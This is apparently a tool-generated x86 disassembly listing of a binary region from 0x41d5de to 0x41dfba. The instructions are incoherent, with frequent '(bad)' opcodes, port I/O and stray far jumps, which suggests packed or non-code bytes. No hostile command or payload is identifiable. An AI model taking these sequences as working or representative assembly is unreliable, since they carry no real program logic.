  41d5de:	rcr    BYTE PTR [eax+0x74],1
  41d5e1:	out    dx,al
  41d5e2:	ins    BYTE PTR es:[edi],dx
  41d5e3:	jg     0x41d597
  41d5e5:	cmp    BYTE PTR ds:0x32bd006,0xd6
  41d5ec:	lods   al,BYTE PTR ds:[esi]
  41d5ed:	mov    DWORD PTR [edi+0x2e],esi
  41d5f0:	add    BYTE PTR [esp+ebx*2],cl
  41d5f3:	or     eax,0x6ec44bab
  41d5f8:	mov    DWORD PTR [edi],ecx
  41d5fa:	fmul   QWORD PTR [eax]
  41d5fc:	arpl   WORD PTR [esi+0x6d],di
  41d5ff:	cld    
  41d600:	add    al,0xcf
  41d602:	xchg   ebx,eax
  41d603:	and    al,0x11
  41d605:	xchg   edi,eax
  41d606:	xchg   esi,eax
  41d607:	cmp    esp,edx
  41d609:	adc    ch,BYTE PTR [ebx]
  41d60b:	inc    ebp
  41d60c:	scas   al,BYTE PTR es:[edi]
  41d60d:	iret   
  41d60e:	adc    BYTE PTR [ebx],ah
	...
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x1d66e435
  41d681:	push   esi
  41d682:	sub    DWORD PTR [edx+0x70],0x4000138
  41d689:	add    DWORD PTR [eax],eax
  41d68b:	add    BYTE PTR [eax-0x43],bl
  41d68e:	not    BYTE PTR [ebp+edx*2-0x72]
  41d692:	pop    ebx
  41d693:	jl     0x41d65b
  41d695:	add    edx,eax
  41d697:	(bad)  
  41d698:	test   eax,0xf113af8b
  41d69d:	nop
  41d69e:	xchg   esi,eax
  41d69f:	(bad)  
  41d6a0:	pop    ebx
  41d6a1:	lea    ebx,[edi-0x6da6749e]
  41d6a7:	stos   BYTE PTR es:[edi],al
  41d6a8:	pop    esi
  41d6a9:	fidiv  DWORD PTR [eax+0x3e3286c8]
  41d6af:	imul   DWORD PTR [edi-0x358768e6]
  41d6b5:	add    al,BYTE PTR [ebx+0x392431b3]
  41d6bb:	lds    edi,FWORD PTR [ecx-0x62]
  41d6be:	mov    ah,0x66
  41d6c0:	out    0xc9,al
  41d6c2:	scas   al,BYTE PTR es:[edi]
  41d6c3:	sbb    BYTE PTR [edx-0x3bad2699],dl
  41d6c9:	push   ebp
  41d6ca:	adc    ebp,DWORD PTR [edi]
  41d6cc:	mov    ebx,0xa570f325
  41d6d1:	mov    gs,WORD PTR [eax-0x1]
  41d6d4:	and    eax,0x64fc405
  41d6d9:	mov    edx,edx
  41d6db:	bound  edx,QWORD PTR [edi-0x36]
  41d6de:	scas   al,BYTE PTR es:[edi]
  41d6df:	fs es lock mov al,0x30
  41d6e4:	mov    cl,0x9
  41d6e6:	lock cli 
  41d6e8:	xor    DWORD PTR [ecx-0x240416b5],0x4c9d26b2
  41d6f2:	out    0x30,eax
  41d6f4:	jnp    0x41d775
  41d6f6:	jo     0x41d756
  41d6f8:	mov    ds:0x3c33c62a,eax
  41d6fd:	call   0xd779:0xb7252e89
  41d704:	add    al,BYTE PTR [ecx-0x60]
  41d707:	clc    
  41d708:	inc    edi
  41d709:	mov    edi,0xd8a333ab
  41d70e:	js     0x41d72a
  41d710:	pop    eax
  41d711:	lods   al,BYTE PTR ds:[esi]
  41d712:	aad    0x3e
  41d714:	lock ins DWORD PTR es:[edi],dx
  41d716:	jg     0x41d72a
  41d718:	out    0x88,al
  41d71a:	add    esp,DWORD PTR ss:[ebx+0x74]
  41d71e:	lock pop ecx
  41d720:	push   ecx
  41d721:	xor    DWORD PTR [ebp+0x12683b44],esi
  41d727:	pop    ebx
  41d728:	retf   
  41d729:	pusha  
  41d72a:	mov    cl,0xe
  41d72c:	repnz and bl,bh
  41d72f:	mov    al,0x91
  41d731:	push   ebx
  41d732:	stc    
  41d733:	xchg   ebp,eax
  41d734:	ror    ah,1
  41d736:	cdq    
  41d737:	es adc eax,0xe7c8dcb2
  41d73d:	call   0x57c5:0x86fcc521
  41d744:	pop    esi
  41d745:	fs and eax,0x915d005b
  41d74b:	dec    ebp
  41d74c:	scas   al,BYTE PTR es:[edi]
  41d74d:	push   ecx
  41d74e:	add    eax,0x28f058a7
  41d753:	sub    eax,0x12b5009d
  41d758:	inc    eax
  41d759:	xchg   ecx,eax
  41d75a:	mov    al,0xf1
  41d75c:	jb     0x41d750
  41d75e:	mov    ebp,0xfdd784a1
  41d763:	std    
  41d764:	les    edx,FWORD PTR [esi]
  41d766:	mov    ds:0x96991e89,eax
  41d76b:	fist   WORD PTR [eax-0x5e]
  41d76e:	nop
  41d76f:	jl     0x41d717
  41d771:	mov    WORD PTR [edi],fs
  41d773:	sahf   
  41d774:	sbb    ecx,DWORD PTR [esi+0x455ae1aa]
  41d77a:	fs inc edx
  41d77c:	xor    BYTE PTR [esp+edi*8+0x5c],0x6f
  41d781:	inc    ecx
  41d782:	loope  0x41d738
  41d784:	jbe    0x41d710
  41d786:	out    dx,eax
  41d787:	inc    edx
  41d788:	prefetch (bad)
  41d789:	or     eax,0xa6d4fce1
  41d78e:	lds    edi,FWORD PTR [ebx]
	...
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	sbb    eax,esi
  41d802:	and    edx,esp
  41d804:	je     0x41d83f
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    al,0x1
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	cld    
  41d80d:	xor    ebp,DWORD PTR [edi+0x38]
  41d810:	js     0x41d886
  41d812:	scas   eax,DWORD PTR es:[edi]
  41d813:	cmc    
  41d814:	icebp  
  41d815:	add    DWORD PTR [eax-0x504592eb],eax
  41d81b:	in     al,dx
  41d81c:	jae    0x41d80f
  41d81e:	shl    dl,1
  41d820:	dec    ebp
  41d821:	lods   eax,DWORD PTR ds:[esi]
  41d822:	lods   eax,DWORD PTR ds:[esi]
  41d823:	inc    ebp
  41d824:	cs push eax
  41d826:	add    ecx,esp
  41d828:	test   cl,0x60
  41d82b:	jne    0x41d7e8
  41d82d:	test   DWORD PTR [ebx-0x6c],0xec7e38e1
  41d834:	push   ss
  41d835:	(bad)  
  41d836:	jno    0x41d7df
  41d838:	iret   
  41d839:	int3   
  41d83a:	jmp    0xdbf5:0x73d2d7c3
  41d841:	sbb    ecx,esi
  41d843:	mov    BYTE PTR [edx+0x36],cl
  41d846:	icebp  
  41d847:	mov    ds:0x5b83bda7,eax
  41d84c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d84d:	test   ecx,ecx
  41d84f:	adc    edi,esp
  41d851:	out    dx,al
  41d852:	aaa    
  41d853:	cli    
  41d854:	push   0xca1696a
  41d859:	in     al,0x46
  41d85b:	loop   0x41d856
  41d85d:	sbb    DWORD PTR [edx-0x377f3f6b],edi
  41d863:	xchg   esp,eax
  41d864:	fs inc ebx
  41d866:	ret    0xc19f
  41d869:	add    ah,BYTE PTR [ecx-0x59f868c]
  41d86f:	repnz test al,0x5
  41d872:	mov    cl,0xfe
  41d874:	pop    ecx
  41d875:	mov    edi,0x651bc5de
  41d87a:	les    edx,FWORD PTR [ecx]
  41d87c:	idiv   DWORD PTR [ebp+0x1f297271]
  41d882:	jns    0x41d86e
  41d884:	sbb    al,BYTE PTR [ebp+0x49f19dc4]
  41d88a:	mov    ch,0x64
  41d88c:	(bad)  
  41d88d:	aad    0xc5
  41d88f:	and    eax,0x340888f6
  41d894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d895:	xchg   edx,eax
  41d896:	mov    ebx,0x7278c188
  41d89b:	arpl   WORD PTR [esi+0x1],di
  41d89e:	sti    
  41d89f:	jnp    0x41d905
  41d8a1:	std    
  41d8a2:	mov    ds:0x4650e406,eax
  41d8a7:	adc    bl,cl
  41d8a9:	aas    
  41d8aa:	les    edi,FWORD PTR [eax-0x57166f5b]
  41d8b0:	or     eax,0xe0d20572
  41d8b5:	or     ch,BYTE PTR [eax]
  41d8b7:	nop
  41d8b8:	adc    al,0xd7
  41d8ba:	jo     0x41d8c8
  41d8bc:	sbb    cl,dh
  41d8be:	sub    bl,BYTE PTR [edi+0x7f9d9d00]
  41d8c4:	push   edi
  41d8c5:	ret    0xba56
  41d8c8:	and    DWORD PTR [ebp+0x66a5a53e],0xbd4a50d1
  41d8d2:	inc    eax
  41d8d3:	jl     0x41d8bf
  41d8d5:	push   ebp
  41d8d6:	pop    ss
  41d8d7:	ja     0x41d8cb
  41d8d9:	push   eax
  41d8da:	out    0xc5,eax
  41d8dc:	add    eax,0xc851b20f
  41d8e1:	sbb    eax,0x46d250ca
  41d8e6:	or     al,0x2f
  41d8e8:	sahf   
  41d8e9:	aas    
  41d8ea:	dec    esp
  41d8eb:	cmp    BYTE PTR [ecx+eax*8],al
  41d8ee:	inc    ebx
  41d8ef:	stos   DWORD PTR es:[edi],eax
  41d8f0:	imul   DWORD PTR [edi]
  41d8f2:	lods   al,BYTE PTR ds:[esi]
  41d8f3:	or     DWORD PTR [ebp+0x2871d47b],0x74
  41d8fa:	ss test eax,0xac8b02e5
  41d900:	sbb    eax,0x3d56c08c
  41d905:	sbb    BYTE PTR [eax-0x14],bl
  41d908:	int    0x2a
  41d90a:	or     DWORD PTR [esi-0x30],ebx
  41d90d:	daa    
  41d90e:	adc    ebp,esp
	...
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs loope 0x41d903
  41d982:	rcl    dl,0x78
  41d985:	cmp    al,BYTE PTR [ecx]
  41d987:	add    BYTE PTR [ecx+eax*1],al
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	push   esi
  41d98d:	popf   
  41d98e:	jb     0x41d9fa
  41d990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d991:	fwait
  41d992:	add    DWORD PTR [ecx-0x14],0x9fca49cd
  41d999:	cmp    eax,0x2c7599a5
  41d99e:	ins    DWORD PTR es:[edi],dx
  41d99f:	cmp    eax,0xf5fa7338
  41d9a4:	pop    ebp
  41d9a5:	pop    ds
  41d9a6:	push   edi
  41d9a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9a8:	mov    ds:0xd5485be3,al
  41d9ad:	scas   al,BYTE PTR es:[edi]
  41d9ae:	div    BYTE PTR [eax]
  41d9b0:	(bad)  
  41d9b1:	pusha  
  41d9b2:	pop    ecx
  41d9b3:	jecxz  0x41d991
  41d9b5:	or     DWORD PTR [ecx-0x47ca5f1b],esp
  41d9bb:	push   ecx
  41d9bc:	arpl   WORD PTR [ecx],cx
  41d9be:	(bad)  
  41d9bf:	addr16 das 
  41d9c1:	imul   edi,DWORD PTR [esi-0x2f71fa64],0xc68d6bf5
  41d9cb:	dec    eax
  41d9cc:	xor    al,BYTE PTR [ebp-0x31]
  41d9cf:	mov    ebp,0xa125f9d7
  41d9d4:	(bad)
  41d9d7:	dec    ebp
  41d9d8:	popa   
  41d9d9:	mov    sp,bx
  41d9dc:	jne    0x41da1b
  41d9de:	test   eax,0x4a81fd6
  41d9e3:	dec    ebp
  41d9e4:	jbe    0x41da07
  41d9e6:	dec    ebx
  41d9e7:	lea    eax,[edi]
  41d9e9:	mov    dh,0x56
  41d9eb:	outs   dx,BYTE PTR ds:[esi]
  41d9ec:	lods   al,BYTE PTR ds:[esi]
  41d9ed:	int3   
  41d9ee:	jnp    0x41da6c
  41d9f0:	data16 and al,0x7a
  41d9f3:	jg     0x41d9ad
  41d9f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9f6:	retf   0xe238
  41d9f9:	popa   
  41d9fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9fb:	imul   edi,esp,0x97659cca
  41da01:	les    esi,FWORD PTR [edi+0xe]
  41da04:	cdq    
  41da05:	test   eax,0xba27e5d5
  41da0b:	arpl   bx,sp
  41da0d:	bound  esi,QWORD PTR [edi+0x36fb2e40]
  41da13:	cmp    dh,bl
  41da15:	loopne 0x41da0d
  41da17:	add    bh,bl
  41da19:	dec    ebp
  41da1a:	sub    ecx,DWORD PTR cs:[eax]
  41da1d:	outs   dx,BYTE PTR ds:[esi]
  41da1e:	jae    0x41d9d7
  41da20:	cli    
  41da21:	mov    ds,WORD PTR [ebx+0x44af078a]
  41da27:	repnz inc esi
  41da29:	leave  
  41da2a:	mov    ch,0xe9
  41da2c:	xchg   edi,eax
  41da2d:	test   DWORD PTR [edx],ebp
  41da2f:	scas   al,BYTE PTR es:[edi]
  41da30:	xchg   DWORD PTR [ecx+0x47fc0197],ecx
  41da36:	repnz (bad) 
  41da38:	and    al,0x28
  41da3a:	jns    0x41da88
  41da3c:	pop    ss
  41da3d:	outs   dx,BYTE PTR ds:[esi]
  41da3e:	mov    bh,BYTE PTR [ecx+0xe]
  41da41:	jl     0x41d9ec
  41da43:	xchg   ebx,eax
  41da44:	out    0x28,eax
  41da46:	not    ebp
  41da48:	sahf   
  41da49:	test   al,0x67
  41da4b:	stc    
  41da4c:	ja     0x41da4c
  41da4e:	add    edx,DWORD PTR [ebx]
  41da50:	pop    es
  41da51:	pop    eax
  41da52:	add    ch,BYTE PTR [edi+edx*4+0x11]
  41da56:	mov    DWORD PTR [edi+0x53],esi
  41da59:	mov    ds:0xe7af7d1,eax
  41da5e:	inc    ebp
  41da5f:	dec    esp
  41da60:	jae    0x41da01
  41da62:	mov    gs,WORD PTR [edi]
  41da64:	(bad)  
  41da65:	cmp    DWORD PTR [eax],edx
  41da67:	inc    ecx
  41da68:	ret    0x9b7f
  41da6b:	sub    cl,cl
  41da6d:	out    dx,eax
  41da6e:	jg     0x41da84
  41da70:	xor    ebx,DWORD PTR [ecx]
  41da72:	loop   0x41da56
  41da74:	xor    BYTE PTR [edi],0x4b
  41da77:	jmp    0x41dad3
  41da79:	pop    es
  41da7a:	push   ebp
  41da7b:	jns    0x41dafc
  41da7d:	push   ss
  41da7e:	icebp  
  41da7f:	pop    ebp
  41da80:	inc    esp
  41da81:	dec    esp
  41da82:	dec    ecx
  41da83:	les    ebx,FWORD PTR [edi-0x244980cb]
  41da89:	jmp    0x41da35
  41da8b:	fdiv   DWORD PTR [ebx]
  41da8d:	mov    ebp,0x4e94
	...
  41daf2:	add    BYTE PTR [eax],al
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x4
  41db01:	pop    ecx
  41db02:	add    cl,cl
  41db04:	jl     0x41db41
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    al,0x1
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	in     eax,dx
  41db0d:	mov    al,ds:0x534809a0
  41db12:	idiv   esp
  41db14:	retf   
  41db15:	dec    si
  41db17:	popa   
  41db18:	adc    DWORD PTR [edx],edx
  41db1a:	loopne 0x41db8d
  41db1c:	ret    0xd215
  41db1f:	pop    esi
  41db20:	mov    edx,DWORD PTR [edi]
  41db22:	repnz push es
  41db24:	(bad)  
  41db25:	sbb    bh,BYTE PTR [esi]
  41db27:	popa   
  41db28:	cwde   
  41db29:	retf   0x8f13
  41db2c:	out    dx,eax
  41db2d:	sbb    BYTE PTR [eax-0x2e],dl
  41db30:	inc    ebp
  41db31:	pop    ebx
  41db32:	jbe    0x41db46
  41db34:	stos   BYTE PTR es:[edi],al
  41db35:	xor    edx,eax
  41db37:	mov    gs:0xe79f08a3,al
  41db3d:	inc    edx
  41db3e:	add    ecx,edi
  41db40:	sahf   
  41db41:	(bad)  
  41db43:	add    ecx,edi
  41db45:	add    eax,edx
  41db47:	dec    edi
  41db48:	mov    al,dh
  41db4a:	lea    edi,[edi]
  41db4c:	cmp    BYTE PTR [edx+ebp*4+0x437ae60e],bl
  41db53:	jae    0x41db52
  41db55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db56:	icebp  
  41db57:	dec    ebp
  41db58:	cmp    BYTE PTR [ebp-0xa889f01],bh
  41db5e:	xor    BYTE PTR [ebx+0x686f2355],dl
  41db64:	sahf   
  41db65:	std    
  41db66:	in     al,0x51
  41db68:	inc    edx
  41db69:	mov    BYTE PTR ss:[eax+0x3],ch
  41db6d:	jno    0x41db5a
  41db6f:	adc    al,0x7e
  41db71:	mov    ebx,0xe2dc23e4
  41db76:	addr16 pusha 
  41db78:	push   ds
  41db79:	pop    edx
  41db7a:	loope  0x41db76
  41db7c:	push   ecx
  41db7d:	sbb    esi,DWORD PTR [ecx+eiz*8+0x2b]
  41db81:	ins    DWORD PTR es:[edi],dx
  41db82:	xchg   esp,eax
  41db83:	aam    0xc0
  41db85:	or     edi,DWORD PTR [ecx+0x7a]
  41db88:	(bad)  
  41db89:	sbb    al,0xa8
  41db8b:	sbb    ebp,edx
  41db8d:	xlat   BYTE PTR ds:[ebx]
  41db8e:	push   0xffffffe8
  41db90:	scas   eax,DWORD PTR es:[edi]
  41db91:	dec    ecx
  41db92:	adc    BYTE PTR [ecx+0x38a7ff85],bh
  41db98:	push   ds
  41db99:	lods   al,BYTE PTR ds:[esi]
  41db9a:	jo     0x41db8a
  41db9c:	jmp    0x41dc18
  41db9e:	fstp   DWORD PTR [edi-0x5abd094e]
  41dba4:	pusha  
  41dba5:	mov    esi,0xf8c19a4b
  41dbaa:	sbb    al,0xc2
  41dbac:	jb     0x41db98
  41dbae:	(bad)  [ebp-0x152b7849]
  41dbb4:	pop    esi
  41dbb5:	cdq    
  41dbb6:	cmp    esp,DWORD PTR [eax+esi*4]
  41dbb9:	add    eax,ebx
  41dbbb:	(bad)  
  41dbbd:	jp     0x41db6d
  41dbbf:	jnp    0x41db44
  41dbc1:	mov    bh,0xa2
  41dbc3:	test   BYTE PTR [edx-0x22a6d110],dh
  41dbc9:	pop    edi
  41dbca:	mov    dl,0xd9
  41dbcc:	jbe    0x41db64
  41dbce:	inc    edi
  41dbcf:	xchg   edi,eax
  41dbd0:	cmc    
  41dbd1:	xor    DWORD PTR [ecx],0x118b1557
  41dbd7:	retf   
  41dbd8:	push   edx
  41dbd9:	xor    DWORD PTR [edi+0x38],eax
  41dbdc:	cmp    al,0x39
  41dbde:	outs   dx,BYTE PTR ds:[esi]
  41dbdf:	in     al,dx
  41dbe0:	sub    cl,al
  41dbe2:	xor    al,BYTE PTR ds:0x30ab9dea
  41dbe8:	into   
  41dbe9:	rcl    DWORD PTR [eax+esi*2],1
  41dbec:	fwait
  41dbed:	adc    BYTE PTR [ecx-0x50],al
  41dbf0:	not    DWORD PTR [eax-0xd8005e8]
  41dbf6:	dec    edx
  41dbf7:	repnz cld 
  41dbf9:	adc    eax,DWORD PTR [ebx]
  41dbfb:	fdivr  QWORD PTR [ecx+ecx*4+0x4d320a7a]
  41dc02:	aas    
  41dc03:	lods   eax,DWORD PTR ds:[esi]
  41dc04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc05:	adc    al,0xdb
  41dc07:	les    ebx,FWORD PTR [ebx]
  41dc09:	bound  edi,QWORD PTR gs:[ebx]
  41dc0c:	js     0x41dc66
  41dc0e:	ret    
  41dc0f:	add    eax,0x0
	...
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi-0x474f2fb0]
  41dc81:	fwait
  41dc82:	inc    ebx
  41dc83:	dec    ebp
  41dc84:	cmp    BYTE PTR [ecx+eax*1],0x0
  41dc88:	add    al,0x1
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	mov    ebp,0x971a63eb
  41dc91:	imul   ebx,DWORD PTR [ecx],0x5c
  41dc94:	jmp    0x41dc7d
  41dc96:	sub    bh,bh
  41dc98:	mov    ds:0x35edc4d4,al
  41dc9d:	sbb    eax,0xc248e946
  41dca2:	loop   0x41dcb1
  41dca4:	push   esi
  41dca5:	add    al,0x55
  41dca7:	pop    eax
  41dca8:	mov    bh,0xa5
  41dcaa:	mov    bl,0xbc
  41dcac:	inc    eax
  41dcad:	jnp    0x41dca8
  41dcaf:	loop   0x41dc7b
  41dcb1:	inc    ecx
  41dcb2:	je     0x41dccf
  41dcb4:	mov    al,ds:0x2344283a
  41dcb9:	imul   edx,edx,0x2e
  41dcbc:	and    BYTE PTR [ebx],dh
  41dcbe:	jns    0x41dd26
  41dcc0:	cmp    esp,edi
  41dcc2:	icebp  
  41dcc3:	mov    ds:0xd6f09c55,al
  41dcc8:	dec    edi
  41dcc9:	lock jne 0x41dd17
  41dccc:	xchg   ecx,eax
  41dccd:	jmp    0x3c288e96
  41dcd2:	sub    eax,0xaf061ac9
  41dcd7:	aas    
  41dcd8:	stos   DWORD PTR es:[edi],eax
  41dcd9:	sbb    ebp,esi
  41dcdb:	mov    al,ds:0x725d453a
  41dce0:	aaa    
  41dce1:	iret   
  41dce2:	mov    ds:0x18b301b7,eax
  41dce7:	addr16 fdivr st,st(6)
  41dcea:	mov    dh,0x51
  41dcec:	xor    bl,bl
  41dcee:	cdq    
  41dcef:	xchg   BYTE PTR [eax-0x439e9346],bh
  41dcf5:	dec    ecx
  41dcf6:	dec    ebx
  41dcf7:	pop    esp
  41dcf8:	mov    al,ds:0x889645a8
  41dcfd:	xchg   ecx,eax
  41dcfe:	(bad)  
  41dcff:	cmp    eax,edi
  41dd01:	in     al,dx
  41dd02:	addr16 shl dh,1
  41dd05:	sahf   
  41dd06:	jmp    0x2a2f3c25
  41dd0b:	in     al,0x37
  41dd0d:	dec    ecx
  41dd0e:	xor    eax,0x52269ba
  41dd13:	mov    ds:0x4a8bc378,al
  41dd18:	lahf   
  41dd19:	retf   0xc5ee
  41dd1c:	clc    
  41dd1d:	aas    
  41dd1e:	ror    BYTE PTR [edx-0x45],0x71
  41dd22:	xor    al,0x55
  41dd24:	outs   dx,DWORD PTR ds:[esi]
  41dd25:	std    
  41dd26:	adc    DWORD PTR [esi+edx*8-0x1c],0x3d4151d3
  41dd2e:	jp     0x41dd42
  41dd30:	xor    al,0x3d
  41dd32:	adc    ebx,DWORD PTR [edx]
  41dd34:	push   0x45722752
  41dd39:	pop    es
  41dd3a:	dec    edi
  41dd3b:	aas    
  41dd3c:	aaa    
  41dd3d:	fdiv   DWORD PTR [edx]
  41dd3f:	fidivr WORD PTR [esi-0x60ae3643]
  41dd45:	adc    al,0x1e
  41dd47:	test   BYTE PTR [esi],al
  41dd49:	and    ebp,0xb574ff0a
  41dd4f:	pop    ds
  41dd50:	mov    ecx,ebx
  41dd52:	scas   eax,DWORD PTR es:[edi]
  41dd53:	imul   BYTE PTR [eax+ecx*8+0x56]
  41dd57:	inc    edx
  41dd58:	imul   edx,DWORD PTR [esi],0xa8ca7f71
  41dd5e:	push   0x8e1946f1
  41dd63:	add    edx,DWORD PTR [esi-0x2d]
  41dd66:	icebp  
  41dd67:	dec    esi
  41dd68:	fist   DWORD PTR [ecx]
  41dd6a:	seta   BYTE PTR [ecx]
  41dd6d:	popf   
  41dd6e:	lea    eax,[ebx+0x70ad0466]
  41dd74:	mov    ah,0x3f
  41dd76:	fisub  DWORD PTR [edx+esi*4]
  41dd79:	lods   eax,DWORD PTR ds:[esi]
  41dd7a:	mov    ecx,0xab959f4c
  41dd7f:	daa    
  41dd80:	shl    BYTE PTR [ecx+0x2b0902e0],1
  41dd86:	dec    ebp
  41dd87:	nop
  41dd88:	(bad)  
  41dd89:	rcr    edx,cl
  41dd8b:	in     al,dx
  41dd8c:	std    
  41dd8d:	mov    ds:0xd177,eax
	...
  41ddf2:	add    BYTE PTR [eax],al
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	dec    ebx
  41de01:	sub    ah,bl
  41de03:	rol    BYTE PTR [ebp+edi*1+0x1040001],0x0
  41de0b:	add    cl,ah
  41de0d:	xlat   BYTE PTR ds:[ebx]
  41de0e:	jp     0x41ddf8
  41de10:	pop    es
  41de11:	sti    
  41de12:	mov    edx,0xa4b6fc06
  41de17:	fwait
  41de18:	das    
  41de19:	xchg   ebx,eax
  41de1a:	adc    ecx,DWORD PTR ds:0x9571d108
  41de20:	nop
  41de21:	(bad)  
  41de22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de23:	fwait
  41de24:	add    esp,0x7c
  41de27:	test   al,0xb7
  41de29:	fimul  DWORD PTR [ebx+ebx*1-0x51659fea]
  41de30:	push   DWORD PTR [ebx+0x6a]
  41de33:	(bad)  
  41de34:	(bad)  
  41de35:	pop    edi
  41de36:	enter  0xdb39,0xed
  41de3a:	push   es
  41de3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de3c:	ins    DWORD PTR es:[edi],dx
  41de3d:	and    eax,0x8d961ca0
  41de42:	sar    al,1
  41de44:	push   0xeb5056b2
  41de49:	les    esp,FWORD PTR [esi+0x59c305a2]
  41de4f:	imul   esp,DWORD PTR [edi-0x47],0x20ea51d6
  41de56:	pop    ebp
  41de57:	fild   WORD PTR [ecx*8-0x5837fed1]
  41de5e:	inc    eax
  41de5f:	xchg   esp,eax
  41de60:	xor    ah,BYTE PTR [ebp-0x28]
  41de63:	addr16 and al,0xd3
  41de66:	retf   
  41de67:	mov    ds:0x5fbe9354,eax
  41de6c:	mov    ah,0xf9
  41de6e:	pop    ebx
  41de6f:	ins    DWORD PTR es:[edi],dx
  41de70:	imul   esi,ebx,0xffffffea
  41de73:	and    ah,al
  41de75:	dec    ecx
  41de76:	mov    dh,0xfe
  41de78:	clc    
  41de79:	lods   al,BYTE PTR ds:[esi]
  41de7a:	leave  
  41de7b:	loope  0x41dea1
  41de7d:	ret    
  41de7e:	out    0x9a,al
  41de80:	inc    esp
  41de81:	lea    edx,[ecx+eax*8+0x45a89628]
  41de88:	mov    esi,0x92f2c08f
  41de8d:	lea    esi,[ebx+0x5c]
  41de90:	dec    edx
  41de91:	pop    eax
  41de92:	pop    ebx
  41de93:	loop   0x41de23
  41de95:	jge    0x41dee4
  41de97:	adc    eax,0x911a4116
  41de9c:	mov    BYTE PTR [eax+0x77],dl
  41de9f:	mov    DWORD PTR [eax],edx
  41dea1:	mov    ecx,0xdbb52c52
  41dea6:	(bad)  [edx+0x40]
  41dea9:	test   esp,esi
  41deab:	xor    BYTE PTR [edi-0x44c2cda7],ah
  41deb1:	stc    
  41deb2:	adc    DWORD PTR ds:0x214af024,ebp
  41deb8:	push   ebp
  41deb9:	js     0x41dead
  41debb:	fld    TBYTE PTR [ebx+0x70662223]
  41dec1:	mov    DWORD PTR [esi-0x5f],eax
  41dec4:	fwait
  41dec5:	icebp  
  41dec6:	mov    bl,0xc2
  41dec8:	fdivr  QWORD PTR [eax-0x131a4c2c]
  41dece:	shr    BYTE PTR [ebp+0x72],cl
  41ded1:	dec    edi
  41ded2:	sahf   
  41ded3:	sub    BYTE PTR ds:0x8dcb9098,ch
  41ded9:	pop    ds
  41deda:	scas   eax,DWORD PTR es:[edi]
  41dedb:	dec    DWORD PTR [eax+0x77]
  41dede:	dec    ebx
  41dedf:	pop    ebx
  41dee0:	mov    esi,0xa60f07cb
  41dee5:	pop    ecx
  41dee6:	repnz sbb BYTE PTR [eax-0x6b],0xb
  41deeb:	cmc    
  41deec:	push   es
  41deed:	add    eax,esp
  41deef:	fbstp  TBYTE PTR [edx]
  41def1:	mov    ebp,0x6074627d
  41def6:	mov    eax,ds:0x7810403d
  41defb:	daa    
  41defc:	inc    edi
  41defd:	xchg   esi,eax
  41defe:	(bad)  
  41deff:	xor    dl,BYTE PTR [edx-0x1b]
  41df02:	iret   
  41df03:	xlat   BYTE PTR ds:[ebx]
  41df04:	cli    
  41df05:	in     al,dx
  41df06:	jne    0x41df7e
  41df08:	lods   eax,DWORD PTR ds:[esi]
  41df09:	fistp  WORD PTR [esi]
  41df0b:	fcomp  st(2)
  41df0d:	and    al,0x67
  41df0f:	mov    eax,ds:0x0
	...
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xa9eb9ce9
  41df82:	or     BYTE PTR [ecx+0x13e88],bl
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	push   ss
  41df8d:	fstp   QWORD PTR [esi]
  41df8f:	or     BYTE PTR [edx-0x6e],bh
  41df92:	adc    BYTE PTR [esi+0x2e],0xc5
  41df96:	in     eax,0x9f
  41df98:	or     BYTE PTR [ebx],0x4c
  41df9b:	ja     0x41dfe6
  41df9d:	popf   
  41df9e:	sub    DWORD PTR [edi+eiz*1-0x43],esp
  41dfa2:	push   ss
  41dfa3:	mov    esp,DWORD PTR [ecx+0x21]
  41dfa6:	sahf   
  41dfa7:	cld    
  41dfa8:	das    
  41dfa9:	adc    DWORD PTR [ecx-0x64],ebp
  41dfac:	mov    BYTE PTR [ecx],ah
  41dfae:	xor    bl,0x45
  41dfb1:	stos   DWORD PTR es:[edi],eax
  41dfb2:	call   0xb31f:0xf669d968
  41dfb9:	outs   dx,DWORD PTR ds:[esi]
  41dfba:	jno    0x41e01c
